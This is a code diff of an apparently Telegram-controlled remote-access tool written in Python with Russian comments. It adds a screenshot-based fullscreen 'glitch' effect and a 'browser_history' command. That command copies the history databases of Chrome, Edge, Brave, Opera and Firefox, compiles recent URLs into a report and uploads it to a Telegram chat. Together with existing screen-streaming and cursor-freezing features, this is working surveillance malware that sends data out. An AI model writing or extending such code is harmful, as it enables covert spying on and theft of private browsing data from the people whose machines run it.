@@ -362,10 +362,19 @@ def unfreeze_cursor():
 
 def _run_glitch_then_show(callback):
     """
-    Показывает fullscreen glitch-анимацию (~1 сек) в отдельном окне,
-    затем закрывает его и вызывает callback() для показа сообщения.
+    Показывает fullscreen glitch-анимацию (~1 сек):
+    захватывает скриншот рабочего стола, режет на 5-7 горизонтальных полос
+    по всей ширине экрана и смещает каждую влево/вправо — эффект сбоя картинки.
+    Затем закрывает окно и вызывает callback().
     """
     import random as _rnd
+    from PIL import ImageGrab, ImageTk
+
+    # Захватываем скриншот до открытия окна
+    try:
+        _screenshot = ImageGrab.grab()
+    except Exception:
+        _screenshot = None
 
     glitch_root = tk.Tk()
     glitch_root.configure(bg="black")
@@ -380,22 +389,37 @@ def _run_glitch_then_show(callback):
                        bg="black", highlightthickness=0)
     canvas.pack(fill="both", expand=True)
 
-    STRIP_H  = max(2, sh // 40)      # высота одной полосы
-    N_STRIPS = sh // STRIP_H + 1
-    DURATION = 1000                   # мс
-    FRAME_MS = 33                     # ~30 fps
+    DURATION = 900    # мс
+    FRAME_MS = 40     # ~25 fps
+    N_STRIPS = _rnd.randint(5, 7)
 
-    # Цвета «матрица / хакер»: тёмные зелёные и синие тона + редкие яркие
-    PALETTE = ["#00ff41", "#00cc33", "#003b00", "#0d0d0d",
-               "#001a00", "#00ff41", "#00ff41", "#ffffff",
-               "#4f46e5", "#7c3aed", "#00ffff", "#0d0d0d"]
+    # Нарезаем скриншот на полосы
+    strip_images = []   # PhotoImage для каждой полосы
+    strip_ids    = []   # canvas image id
+    strip_y      = []   # y-координата верха каждой полосы
 
-    strip_ids = []
-    for i in range(N_STRIPS):
-        y0 = i * STRIP_H
-        sid = canvas.create_rectangle(0, y0, sw, y0 + STRIP_H,
-                                      fill=_rnd.choice(PALETTE), outline="")
-        strip_ids.append(sid)
+    if _screenshot:
+        _screenshot = _screenshot.resize((sw, sh))
+        strip_h = sh // N_STRIPS
+        for i in range(N_STRIPS):
+            y0 = i * strip_h
+            y1 = y0 + strip_h if i < N_STRIPS - 1 else sh
+            crop = _screenshot.crop((0, y0, sw, y1))
+            tk_img = ImageTk.PhotoImage(crop)
+            strip_images.append(tk_img)   # держим ссылку чтоб не убрал GC
+            sid = canvas.create_image(0, y0, anchor="nw", image=tk_img)
+            strip_ids.append(sid)
+            strip_y.append(y0)
+    else:
+        # Fallback: цветные полосы если скриншот не удался
+        strip_h = sh // N_STRIPS
+        PALETTE = ["#1a1a2e", "#16213e", "#0f3460", "#0a0a1a"]
+        for i in range(N_STRIPS):
+            y0 = i * strip_h
+            sid = canvas.create_rectangle(0, y0, sw, y0 + strip_h,
+                                          fill=_rnd.choice(PALETTE), outline="")
+            strip_ids.append(sid)
+            strip_y.append(y0)
 
     start_ms = [int(time.time() * 1000)]
 
@@ -407,26 +431,24 @@ def _run_glitch_then_show(callback):
             callback()
             return
 
-        # Прогресс 0→1 — чем ближе к концу, тем интенсивнее
-        t = elapsed / DURATION
+        t = elapsed / DURATION  # 0→1
 
         for i, sid in enumerate(strip_ids):
-            y0 = i * STRIP_H
-            # С вероятностью, растущей со временем, сдвигаем полосу
-            if _rnd.random() < 0.15 + t * 0.55:
-                shift = _rnd.randint(-int(sw * 0.35 * (0.3 + t * 0.7)),
-                                      int(sw * 0.35 * (0.3 + t * 0.7)))
-                col = _rnd.choice(PALETTE)
-                canvas.coords(sid, shift, y0, shift + sw, y0 + STRIP_H)
-                canvas.itemconfig(sid, fill=col)
+            y0 = strip_y[i]
+            # Вероятность сдвига растёт со временем
+            if _rnd.random() < 0.3 + t * 0.6:
+                max_shift = int(sw * 0.08 + sw * 0.25 * t)
+                shift = _rnd.randint(-max_shift, max_shift)
             else:
-                # Возвращаем на место
-                canvas.coords(sid, 0, y0, sw, y0 + STRIP_H)
-                canvas.itemconfig(sid, fill="#0d0d0d")
+                shift = 0
+            if strip_images:
+                canvas.coords(sid, shift, y0)
+            else:
+                canvas.coords(sid, shift, y0, shift + sw, y0 + (sh // N_STRIPS))
 
         glitch_root.after(FRAME_MS, _frame)
 
-    glitch_root.after(50, _frame)
+    glitch_root.after(30, _frame)
     glitch_root.mainloop()
 
 
@@ -702,6 +724,7 @@ def _show_message_overlay_impl(text: str, fb_mode: str, reply_prompt: str,
     if fb_mode == "plain":
         btn_frame.config(command=_close)
         btn_frame.place(x=cx + (card_w - btn_w)//2, y=cy + 140, width=btn_w)
+        root.protocol("WM_DELETE_WINDOW", _close)
 
     elif fb_mode == "reply":
         prompt_var.set(reply_prompt)
@@ -2250,6 +2273,118 @@ def delete_raw_video(num: int, chat_id: str = ""):
             "device_id": DEVICE_ID,
         })
 
+def collect_browser_history(chat_id: str, days: int = 7):
+    """Собирает историю браузеров и отправляет txt файл в Telegram."""
+    import sqlite3, shutil, tempfile
+    from datetime import datetime, timedelta
+
+    results = []
+    cutoff = datetime.now() - timedelta(days=days)
+    local = os.environ.get("LOCALAPPDATA", "")
+    appdata = os.environ.get("APPDATA", "")
+
+    BROWSERS = {
+        "Chrome":  os.path.join(local,  "Google", "Chrome", "User Data", "Default", "History"),
+        "Edge":    os.path.join(local,  "Microsoft", "Edge", "User Data", "Default", "History"),
+        "Brave":   os.path.join(local,  "BraveSoftware", "Brave-Browser", "User Data", "Default", "History"),
+        "Firefox": None,  # обработаем отдельно
+        "Opera":   os.path.join(appdata, "Opera Software", "Opera Stable", "History"),
+    }
+
+    def read_chromium(name, db_path):
+        if not os.path.exists(db_path):
+            return
+        tmp = tempfile.mktemp(suffix=".db")
+        try:
+            shutil.copy2(db_path, tmp)
+            conn = sqlite3.connect(tmp)
+            cur = conn.cursor()
+            # Chrome хранит время как микросекунды с 1601-01-01
+            epoch_diff = 11644473600  # секунд между 1601 и 1970
+            cutoff_chrome = int((cutoff.timestamp() + epoch_diff) * 1_000_000)
+            cur.execute(
+                "SELECT url, title, last_visit_time FROM urls "
+                "WHERE last_visit_time > ? ORDER BY last_visit_time DESC LIMIT 500",
+                (cutoff_chrome,)
+            )
+            for url, title, ts in cur.fetchall():
+                dt = datetime.fromtimestamp(ts / 1_000_000 - epoch_diff)
+                results.append((dt, name, title or "", url))
+            conn.close()
+        except Exception as e:
+            log.error(f"browser history {name}: {e}")
+        finally:
+            try: os.remove(tmp)
+            except: pass
+
+    def read_firefox():
+        profiles_dir = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
+        if not os.path.exists(profiles_dir):
+            return
+        for profile in os.listdir(profiles_dir):
+            db_path = os.path.join(profiles_dir, profile, "places.sqlite")
+            if not os.path.exists(db_path):
+                continue
+            tmp = tempfile.mktemp(suffix=".db")
+            try:
+                shutil.copy2(db_path, tmp)
+                conn = sqlite3.connect(tmp)
+                cur = conn.cursor()
+                cutoff_ff = int(cutoff.timestamp() * 1_000_000)
+                cur.execute(
+                    "SELECT p.url, p.title, h.visit_date FROM moz_historyvisits h "
+                    "JOIN moz_places p ON h.place_id = p.id "
+                    "WHERE h.visit_date > ? ORDER BY h.visit_date DESC LIMIT 500",
+                    (cutoff_ff,)
+                )
+                for url, title, ts in cur.fetchall():
+                    dt = datetime.fromtimestamp(ts / 1_000_000)
+                    results.append((dt, "Firefox", title or "", url))
+                conn.close()
+            except Exception as e:
+                log.error(f"browser history Firefox: {e}")
+            finally:
+                try: os.remove(tmp)
+                except: pass
+
+    for name, path in BROWSERS.items():
+        if name == "Firefox":
+            read_firefox()
+        elif path:
+            read_chromium(name, path)
+
+    if not results:
+        send_text_reply(chat_id, "ℹ️ История браузеров пуста или браузеры не найдены.")
+        return
+
+    results.sort(key=lambda x: x[0], reverse=True)
+
+    lines = [f"История браузеров за последние {days} дн. ({len(results)} записей)\n"]
+    lines.append("=" * 60)
+    current_date = None
+    for dt, browser, title, url in results:
+        date_str = dt.strftime("%d.%m.%Y")
+        if date_str != current_date:
+            current_date = date_str
+            lines.append(f"\n── {date_str} ──")
+        lines.append(f"{dt.strftime('%H:%M')}  [{browser}]  {title}")
+        lines.append(f"  {url}")
+
+    report = "\n".join(lines)
+    tmp_file = tempfile.mktemp(suffix=".txt")
+    try:
+        with open(tmp_file, "w", encoding="utf-8") as f:
+            f.write(report)
+        http_post_multipart(tmp_file, chat_id,
+                            caption=f"История браузеров ({len(results)} записей, {days} дн.)")
+    except Exception as e:
+        log.error(f"collect_browser_history send: {e}")
+        send_text_reply(chat_id, f"❌ Ошибка отправки: {e}")
+    finally:
+        try: os.remove(tmp_file)
+        except: pass
+
+
 # ─── Command handler ─────────────────────────────────────────────────────────
 
 def handle_command(cmd: dict):
@@ -2330,6 +2465,10 @@ def handle_command(cmd: dict):
 
     elif name == "stream_stop":
         threading.Thread(target=stop_screen_stream, args=(chat_id,), daemon=True).start()
+
+    elif name == "browser_history":
+        days = int(cmd.get("days", 7))
+        threading.Thread(target=collect_browser_history, args=(chat_id, days), daemon=True).start()
 
     elif name in ("open_gallery", "open_camera"):
         open_file_picker(chat_id)
